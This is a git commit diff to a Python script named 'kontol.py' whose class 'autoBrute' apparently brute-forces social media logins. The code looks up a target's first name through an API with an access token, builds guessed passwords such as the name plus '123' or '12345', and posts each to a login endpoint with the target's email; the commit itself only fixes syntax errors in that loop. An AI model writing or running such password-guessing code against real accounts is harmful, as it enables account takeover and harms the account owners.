047252bbbc7ffa62873a2be8dc2b94a5e5d03777
Kitket4 <49296465+Kitket4@users.noreply.github.com>
2019-04-25 05:50:53 +0600

    Update kontol.py

--- kontol.py
+++ kontol.py
@@ -91,9 +91,9 @@ class autoBrute:
 		self.user=requests.get(self.a.format(
 			target+"?access_token=%s"%(
 		self.token))).json()["first_name"]
-		for x in [self.user+"123",self.user+"12345",self.user+"123456",self.user+"1234",self.user+"12",self.user+"012",self.user+"1",self.user+"01",self.user+"321"] 
+		for x in [self.user+"123",self.user+"12345",self.user+"123456",self.user+"1234",self.user+"12",self.user+"012",self.user+"1",self.user+"01",self.user+"321"]:
 			r=requests.post(self.i.format("login"),
-				data
+				data=
 					{
 						"email":target,
 						"pass":x
